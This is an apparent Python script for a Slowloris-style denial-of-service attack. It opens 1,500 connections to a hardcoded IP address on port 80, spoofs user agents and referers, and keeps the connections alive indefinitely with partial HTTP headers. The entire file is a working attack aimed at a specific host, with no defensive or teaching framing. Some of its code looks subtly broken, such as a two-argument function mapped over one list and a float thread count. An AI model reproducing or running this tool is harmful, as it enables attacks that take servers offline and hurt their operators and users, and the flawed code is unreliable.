# Libraries
import time
import random
from typing import Optional
from concurrent.futures import ThreadPoolExecutor

# Internal packages
from utils.files import Files
from utils.messages import Messages
from core.slowsock import Slowsock

# Constants
CONNECTIONS_AMOUNT = 1500
THREADS_AMOUNT = CONNECTIONS_AMOUNT * 0.35
TARGET_ADDRESS = "92.222.117.57"
TARGET_PORT = 80
WAIT_TIME = 15
TIMEOUT = 10
USER_AGENTS = Files.read_file("files/user-agents.txt")
REFERERS = Files.read_file("files/referers.txt")
VERBOSE = True

# Objects
msg = Messages(verbose=VERBOSE)


# Function to create a socket
def create_socket(*args) -> Optional[Slowsock]:
    try:
        socket = Slowsock(
            host=TARGET_ADDRESS,
            port=TARGET_PORT,
            timeout=TIMEOUT,
            path=f"/?{random.randint(0, 2000)}",
            user_agent=random.choice(USER_AGENTS),
            referer=random.choice(REFERERS),
        )
        socket.initiate_connection()
        return socket
    except Slowsock.TimeoutError:
        return None
    except Exception as error:
        msg.show_error(f"An unexpected error occurred while creating a socket: {error}")


# Function to create a set of sockets
def create_socket_set(socket_amount: int) -> list[Slowsock]:
    with ThreadPoolExecutor(max_workers=THREADS_AMOUNT) as executor:
        created_sockets = executor.map(create_socket, range(socket_amount))

    # Return successful sockets
    return list(filter(None, created_sockets))


# Function to send data through a socket
def send_data(socket: Slowsock, socket_set: list[Slowsock]) -> None:
    header = f"X-a: {random.randint(1, 5000)}\r\n"
    socket.send_data(header)
    if socket.get_status() != 2:
        socket_set.remove(socket)


# Main function
if __name__ == "__main__":
    # Variables
    socket_set = []

    # Main loop
    try:
        # Create a set of sockets
        msg.show_info(f"Launching attack to {TARGET_ADDRESS} on port {TARGET_PORT}...")
        msg.show_info(f"Creating {CONNECTIONS_AMOUNT} connections...\n")
        socket_set = create_socket_set(CONNECTIONS_AMOUNT)

        while True:
            # Try to send data through each socket
            msg.show_info("Trying to send data through each active connection...\n")
            with ThreadPoolExecutor(max_workers=THREADS_AMOUNT) as executor:
                executor.map(send_data, socket_set)

            # Create sockets if they have been closed
            remaining_sockets = len(socket_set)
            required_amount = CONNECTIONS_AMOUNT - remaining_sockets
            msg.show_success(
                f"Data was sent through {remaining_sockets} active connections."
            )

            if required_amount > 0:
                # Try to create new connections
                msg.show_warning(
                    f"It seems {required_amount} connections were lost in the process."
                )
                msg.show_info(f"Trying to initiate missing connections...")
                socket_set += create_socket_set(required_amount)

                # Check if new connections were initiated
                new_amount = len(socket_set) - remaining_sockets
                if new_amount > 0:
                    msg.show_success(f"{new_amount} connections have been initiated.\n")
                else:
                    msg.show_error("No new connections could be initiated.\n")

            # Wait before continuing
            msg.show_info(f"Waiting {WAIT_TIME} seconds before continuing...")
            time.sleep(WAIT_TIME)
    except KeyboardInterrupt:
        msg.show_warning("The process has been stopped.")
    except Exception as error:
        msg.show_error(f"An unexpected error occurred: {error}")
